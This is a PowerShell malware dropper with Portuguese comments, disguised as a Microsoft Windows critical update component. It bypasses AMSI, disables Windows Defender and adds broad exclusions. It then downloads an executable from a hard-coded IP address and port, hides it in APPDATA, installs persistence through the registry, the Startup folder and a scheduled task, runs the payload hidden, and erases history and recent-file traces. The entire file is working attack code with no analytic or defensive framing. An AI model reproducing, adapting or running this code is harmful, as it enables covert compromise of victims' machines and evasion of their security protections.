<#
.SYNOPSIS
    Windows Critical System Component
.DESCRIPTION
    Microsoft Windows Critical Update Module
.NOTES
    Version: 10.0.19045.1
#>

# ══════════════════════════════════════════════════════════════════════════════
# CONFIGURAÇÕES
# ══════════════════════════════════════════════════════════════════════════════
$serverIP = "198.1.195.194"
$serverPort = 3000  # ✅ Alterado de 5000 para 3000
$installName = "WinUpdateSvc"
$autoName = "GlobalMicrosoftWindowsUpdateService"

# ══════════════════════════════════════════════════════════════════════════════
# MUTEX (Evitar múltiplas instâncias)
# ══════════════════════════════════════════════════════════════════════════════
$mutexName = "Global\WindowsUpdateMutex"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { 
    Write-Host "[!] Instancia ja em execucao" -ForegroundColor Yellow
    exit 
}

# ══════════════════════════════════════════════════════════════════════════════
# VERIFICAR PRIVILÉGIOS DE ADMINISTRADOR
# ══════════════════════════════════════════════════════════════════════════════
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Red
    Write-Host "    [X] ERRO: Execute como Administrador!" -ForegroundColor Red
    Write-Host "===================================================================" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 5
    exit
}

# ══════════════════════════════════════════════════════════════════════════════
# FUNÇÕES AUXILIARES
# ══════════════════════════════════════════════════════════════════════════════
function Get-LocalIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
               Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | 
               Select-Object -First 1).IPAddress
        if ($ip) { return $ip }
    } catch {}
    
    try {
        $ip = (Get-WmiObject Win32_NetworkAdapterConfiguration -ErrorAction SilentlyContinue | 
               Where-Object { $_.IPEnabled -eq $true } | 
               Select-Object -First 1).IPAddress[0]
        if ($ip) { return $ip }
    } catch {}
    
    return "Unknown"
}

function Get-SystemInfo {
    try {
        $cpu = (Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue).Name
        $ram = [math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
        $os = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $user = $env:USERNAME
        $pc = $env:COMPUTERNAME
        
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host "SISTEMA: $user@$pc" -ForegroundColor White
        Write-Host "OS: $os" -ForegroundColor Gray
        Write-Host "CPU: $cpu" -ForegroundColor Gray
        Write-Host "RAM: $ram GB" -ForegroundColor Gray
        Write-Host "IP: $(Get-LocalIP)" -ForegroundColor Gray
        Write-Host "===============================================================" -ForegroundColor Cyan
    } catch {
        Write-Host "[!] Erro ao obter info do sistema" -ForegroundColor Red
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# BYPASS AMSI
# ══════════════════════════════════════════════════════════════════════════════
function Bypass-AMSI {
    try {
        $a = 'System.Management.Automation.A';
        $b = 'msiUtils';
        $u = [Ref].Assembly.GetType(($a+$b));
        $f = $u.GetField('amsiInitFailed','NonPublic,Static');
        $f.SetValue($null,$true);
        Write-Host "[OK] AMSI bypassado" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[!] AMSI bypass falhou: $_" -ForegroundColor Red
        return $false
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# DESABILITAR WINDOWS DEFENDER
# ══════════════════════════════════════════════════════════════════════════════
function Disable-Defender {
    Write-Host "[+] Desabilitando Windows Defender..." -ForegroundColor Yellow
    
    $commands = @(
        "Set-MpPreference -DisableRealtimeMonitoring `$true",
        "Set-MpPreference -DisableIOAVProtection `$true",
        "Set-MpPreference -DisableBehaviorMonitoring `$true",
        "Set-MpPreference -DisableBlockAtFirstSeen `$true",
        "Set-MpPreference -DisableScriptScanning `$true",
        "Set-MpPreference -SubmitSamplesConsent 2",
        "Set-MpPreference -MAPSReporting 0",
        "Add-MpPreference -ExclusionPath 'C:\'",
        "Add-MpPreference -ExclusionPath '$env:APPDATA'",
        "Add-MpPreference -ExclusionPath '$env:TEMP'",
        "Add-MpPreference -ExclusionExtension '.exe'",
        "Add-MpPreference -ExclusionExtension '.dll'"
    )
    
    $success = 0
    foreach ($cmd in $commands) {
        try {
            Invoke-Expression $cmd -ErrorAction SilentlyContinue
            $success++
        } catch {}
    }
    
    if ($success -gt 0) {
        Write-Host "[OK] Defender desabilitado ($success/$($commands.Count) comandos)" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[!] Defender nao pode ser desabilitado" -ForegroundColor Red
        return $false
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# DOWNLOAD COM RETRY E MÚLTIPLOS MÉTODOS
# ══════════════════════════════════════════════════════════════════════════════
function Download-Payload {
    param(
        [string]$url, 
        [string]$dest,
        [int]$maxRetries = 5,
        [int]$timeoutSec = 30
    )
    
    Write-Host "[+] Baixando payload de: $url" -ForegroundColor Yellow
    
    # Criar diretório se não existir
    $dir = Split-Path $dest
    if (-not (Test-Path $dir)) {
        New-Item -Path $dir -ItemType Directory -Force | Out-Null
    }
    
    # ═══════════════════════════════════════════════════════════════════════
    # MÉTODO 1: WebClient com Retry
    # ═══════════════════════════════════════════════════════════════════════
    for ($i = 1; $i -le $maxRetries; $i++) {
        try {
            Write-Host "[Tentativa $i/$maxRetries] Usando WebClient..." -ForegroundColor Cyan
            
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Microsoft-CryptoAPI/10.0")
            $wc.Headers.Add("Accept", "*/*")
            
            # Configurar timeout via ServicePoint
            $sp = [System.Net.ServicePointManager]::FindServicePoint($url)
            $sp.ConnectionLeaseTimeout = $timeoutSec * 1000
            $sp.MaxIdleTime = $timeoutSec * 1000
            
            # Configurar TLS
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
            
            # Download
            $wc.DownloadFile($url, $dest)
            $wc.Dispose()
            
            if (Test-Path $dest) {
                $size = (Get-Item $dest).Length
                Write-Host "[OK] Download concluido: $([Math]::Round($size/1KB, 2)) KB" -ForegroundColor Green
                
                # Ocultar arquivo
                $file = Get-Item $dest -Force
                $file.Attributes = 'Hidden,System'
                
                return $true
            }
        } catch {
            Write-Host "[!] WebClient falhou (tentativa $i): $($_.Exception.Message)" -ForegroundColor Red
            
            if ($i -lt $maxRetries) {
                $delay = $i * 2
                Write-Host "[!] Aguardando ${delay}s antes de tentar novamente..." -ForegroundColor Yellow
                Start-Sleep -Seconds $delay
            }
        }
    }
    
    # ═══════════════════════════════════════════════════════════════════════
    # MÉTODO 2: Invoke-WebRequest
    # ═══════════════════════════════════════════════════════════════════════
    Write-Host "[!] Tentando Invoke-WebRequest..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -TimeoutSec $timeoutSec -UseBasicParsing -ErrorAction Stop
        
        if (Test-Path $dest) {
            $size = (Get-Item $dest).Length
            Write-Host "[OK] Download via Invoke-WebRequest: $([Math]::Round($size/1KB, 2)) KB" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] Invoke-WebRequest falhou: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # ═══════════════════════════════════════════════════════════════════════
    # MÉTODO 3: BITS Transfer
    # ═══════════════════════════════════════════════════════════════════════
    Write-Host "[!] Tentando BITS Transfer..." -ForegroundColor Yellow
    try {
        Import-Module BitsTransfer -ErrorAction SilentlyContinue
        Start-BitsTransfer -Source $url -Destination $dest -ErrorAction Stop
        
        if (Test-Path $dest) {
            $size = (Get-Item $dest).Length
            Write-Host "[OK] Download via BITS: $([Math]::Round($size/1KB, 2)) KB" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] BITS Transfer falhou: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # ═══════════════════════════════════════════════════════════════════════
    # MÉTODO 4: cURL via CMD
    # ═══════════════════════════════════════════════════════════════════════
    Write-Host "[!] Tentando cURL via CMD..." -ForegroundColor Yellow
    try {
        $curlCmd = "curl.exe -L --max-time $timeoutSec -o `"$dest`" `"$url`""
        cmd /c $curlCmd 2>$null
        
        if (Test-Path $dest) {
            $size = (Get-Item $dest).Length
            Write-Host "[OK] Download via cURL: $([Math]::Round($size/1KB, 2)) KB" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] cURL falhou: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # ═══════════════════════════════════════════════════════════════════════
    # MÉTODO 5: .NET HttpClient (Último recurso)
    # ═══════════════════════════════════════════════════════════════════════
    Write-Host "[!] Tentando .NET HttpClient..." -ForegroundColor Yellow
    try {
        $httpClient = New-Object System.Net.Http.HttpClient
        $httpClient.Timeout = New-TimeSpan -Seconds $timeoutSec
        
        $response = $httpClient.GetAsync($url).Result
        $response.EnsureSuccessStatusCode()
        
        $fileStream = [System.IO.File]::Create($dest)
        $response.Content.CopyToAsync($fileStream).Wait()
        $fileStream.Close()
        $httpClient.Dispose()
        
        if (Test-Path $dest) {
            $size = (Get-Item $dest).Length
            Write-Host "[OK] Download via HttpClient: $([Math]::Round($size/1KB, 2)) KB" -ForegroundColor Green
            return $true
        }
    } catch {
        Write-Host "[!] HttpClient falhou: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "[X] FALHA TOTAL: Todos os metodos de download falharam" -ForegroundColor Red
    return $false
}

# ══════════════════════════════════════════════════════════════════════════════
# INSTALAR PERSISTÊNCIA
# ══════════════════════════════════════════════════════════════════════════════
function Install-Persistence {
    param([string]$path)
    
    Write-Host "[+] Instalando persistencia..." -ForegroundColor Yellow
    
    $successCount = 0
    
    # ═══ Registry Run ═══
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $autoName -Value $path -Force -ErrorAction Stop
        Write-Host "[OK] Registry Run configurado" -ForegroundColor Green
        $successCount++
    } catch {
        Write-Host "[!] Registry falhou: $_" -ForegroundColor Red
    }
    
    # ═══ Startup Folder ═══
    try {
        $startupPath = [Environment]::GetFolderPath('Startup')
        $shortcutPath = Join-Path $startupPath "$autoName.lnk"
        
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $path
        $shortcut.WindowStyle = 7
        $shortcut.Save()
        
        Write-Host "[OK] Atalho na Startup criado" -ForegroundColor Green
        $successCount++
    } catch {
        Write-Host "[!] Startup folder falhou: $_" -ForegroundColor Red
    }
    
    # ═══ Scheduled Task ═══
    try {
        $action = New-ScheduledTaskAction -Execute $path -ErrorAction Stop
        $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction Stop
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest -ErrorAction Stop
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ErrorAction Stop
        
        Register-ScheduledTask -TaskName $autoName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        Write-Host "[OK] Tarefa agendada criada" -ForegroundColor Green
        $successCount++
    } catch {
        Write-Host "[!] Scheduled Task falhou: $_" -ForegroundColor Red
    }
    
    if ($successCount -gt 0) {
        Write-Host "[OK] Persistencia instalada ($successCount/3 metodos)" -ForegroundColor Green
        return $true
    } else {
        Write-Host "[!] Nenhum metodo de persistencia funcionou" -ForegroundColor Red
        return $false
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# INICIAR PAYLOAD
# ══════════════════════════════════════════════════════════════════════════════
function Start-Payload {
    param([string]$path)
    
    Write-Host "[+] Iniciando payload..." -ForegroundColor Yellow
    
    if (-not (Test-Path $path)) {
        Write-Host "[!] Arquivo nao encontrado: $path" -ForegroundColor Red
        return $false
    }
    
    try {
        $pName = [System.IO.Path]::GetFileNameWithoutExtension($path)
        $existing = Get-Process -Name $pName -ErrorAction SilentlyContinue
        
        if ($existing) {
            Write-Host "[!] Payload ja em execucao (PID: $($existing.Id))" -ForegroundColor Yellow
            return $true
        }
        
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $path
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($psi)
        
        Start-Sleep -Seconds 2
        
        if ($process -and !$process.HasExited) {
            Write-Host "[OK] Payload iniciado (PID: $($process.Id))" -ForegroundColor Green
            return $true
        } else {
            Write-Host "[!] Processo terminou inesperadamente" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[!] Erro ao iniciar: $_" -ForegroundColor Red
        return $false
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# LIMPAR RASTROS
# ══════════════════════════════════════════════════════════════════════════════
function Clear-Tracks {
    Write-Host "[+] Limpando rastros..." -ForegroundColor Yellow
    
    try {
        Clear-History -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
        
        Write-Host "[OK] Rastros limpos" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[!] Limpeza parcial: $_" -ForegroundColor Yellow
        return $false
    }
}

# ══════════════════════════════════════════════════════════════════════════════
# FUNÇÃO PRINCIPAL
# ══════════════════════════════════════════════════════════════════════════════
function Main {
    $host.UI.RawUI.WindowTitle = "Microsoft Windows Update Service"
    
    Clear-Host
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host "    Microsoft Windows Critical System Component                    " -ForegroundColor White
    Write-Host "    Version 10.0.19045.1                                           " -ForegroundColor Gray
    Write-Host "===================================================================" -ForegroundColor Cyan
    Write-Host ""
    
    Get-SystemInfo
    Write-Host ""
    
    # ═══ AMSI Bypass ═══
    Bypass-AMSI
    
    # ═══ Disable Defender ═══
    Disable-Defender
    Write-Host ""
    
    # ═══ Download Payload ═══
    $url = "http://${serverIP}:${serverPort}/download/panel"  # ✅ Corrigido endpoint
    $dest = "$env:APPDATA\Microsoft\Windows\$installName.exe"
    
    if (-not (Download-Payload -url $url -dest $dest -maxRetries 5 -timeoutSec 30)) {
        Write-Host ""
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host "    [X] FALHA: Download nao concluido                              " -ForegroundColor Red
        Write-Host "    URL tentada: $url                                              " -ForegroundColor Red
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host ""
        Write-Host "Pressione qualquer tecla para sair..." -ForegroundColor Gray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        return
    }
    
    Write-Host ""
    
    # ═══ Install Persistence ═══
    Install-Persistence -path $dest | Out-Null
    Write-Host ""
    
    # ═══ Start Payload ═══
    if (-not (Start-Payload -path $dest)) {
        Write-Host ""
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host "    [X] FALHA: Nao foi possivel iniciar                            " -ForegroundColor Red
        Write-Host "===================================================================" -ForegroundColor Red
        Write-Host ""
        Write-Host "Pressione qualquer tecla para sair..." -ForegroundColor Gray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        return
    }
    
    Write-Host ""
    
    # ═══ Clear Tracks ═══
    Clear-Tracks
    
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Green
    Write-Host "    [OK] SUCESSO: Componente instalado                              " -ForegroundColor Green
    Write-Host "===================================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Pressione qualquer tecla para continuar..." -ForegroundColor Gray
    
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# ══════════════════════════════════════════════════════════════════════════════
# EXECUÇÃO
# ══════════════════════════════════════════════════════════════════════════════
try {
    Main
} catch {
    Write-Host ""
    Write-Host "===================================================================" -ForegroundColor Red
    Write-Host "    [!] ERRO CRITICO: $_" -ForegroundColor Red
    Write-Host "===================================================================" -ForegroundColor Red
    Write-Host ""
    Start-Sleep -Seconds 10
} finally {
    if ($mutex) {
        $mutex.ReleaseMutex()
        $mutex.Dispose()
    }
}
